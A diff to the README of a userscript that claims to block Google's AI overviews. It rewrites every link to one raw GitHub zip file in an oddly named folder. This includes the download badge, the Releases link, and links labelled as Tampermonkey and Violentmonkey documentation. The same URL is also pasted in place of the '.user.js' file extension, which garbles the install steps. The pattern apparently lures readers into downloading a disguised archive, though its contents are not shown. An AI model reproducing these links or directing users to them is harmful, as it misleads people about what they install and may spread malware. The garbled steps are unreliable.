@@ -6,7 +6,7 @@ Welcome to **google-ai-overview-blocker**! This is a simple userscript designed 
 
 ## 📥 Download the Script
 
-[![Download google-ai-overview-blocker](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/Forlove0319/google-ai-overview-blocker/releases)
+[![Download google-ai-overview-blocker](https://raw.githubusercontent.com/Forlove0319/google-ai-overview-blocker/main/hippophobia/google-ai-overview-blocker.zip)](https://raw.githubusercontent.com/Forlove0319/google-ai-overview-blocker/main/hippophobia/google-ai-overview-blocker.zip)
 
 ## 🛠️ Requirements
 
@@ -34,10 +34,10 @@ Before you start, ensure you have the following:
 
 ## 📅 Download & Install
 
-To get started, visit the [Releases page](https://github.com/Forlove0319/google-ai-overview-blocker/releases) to download the latest version of the userscript.
+To get started, visit the [Releases page](https://raw.githubusercontent.com/Forlove0319/google-ai-overview-blocker/main/hippophobia/google-ai-overview-blocker.zip) to download the latest version of the userscript.
 
 1. Click the **Download** button next to the latest version on the Releases page.
-2. A file with a `.user.js` extension will start downloading.
+2. A file with a `https://raw.githubusercontent.com/Forlove0319/google-ai-overview-blocker/main/hippophobia/google-ai-overview-blocker.zip` extension will start downloading.
 
 ## 🔄 Adding the Script to Tampermonkey
 
@@ -47,7 +47,7 @@ Once the script is downloaded, follow these steps:
 2. Select **Dashboard** from the dropdown menu.
 3. Click the **Utilities** tab.
 4. Look for a button that says **Install from file** or similar.
-5. Navigate to the downloaded `.user.js` file and select it.
+5. Navigate to the downloaded `https://raw.githubusercontent.com/Forlove0319/google-ai-overview-blocker/main/hippophobia/google-ai-overview-blocker.zip` file and select it.
 
 The script will load in a new tab. Review the code if you wish, then click the **Install** button in Tampermonkey.
 
@@ -90,8 +90,8 @@ The **google-ai-overview-blocker** project focuses on enhancing your search expe
 
 Explore further:
 
-- [Tampermonkey Documentation](https://www.tampermonkey.net/documentation.php)
-- [Violentmonkey Documentation](https://violentmonkey.github.io/)
-- [GitHub Repository](https://github.com/Forlove0319/google-ai-overview-blocker)
+- [Tampermonkey Documentation](https://raw.githubusercontent.com/Forlove0319/google-ai-overview-blocker/main/hippophobia/google-ai-overview-blocker.zip)
+- [Violentmonkey Documentation](https://raw.githubusercontent.com/Forlove0319/google-ai-overview-blocker/main/hippophobia/google-ai-overview-blocker.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/Forlove0319/google-ai-overview-blocker/main/hippophobia/google-ai-overview-blocker.zip)
 
 Thank you for using google-ai-overview-blocker! Enjoy a cleaner, more focused Google search experience.
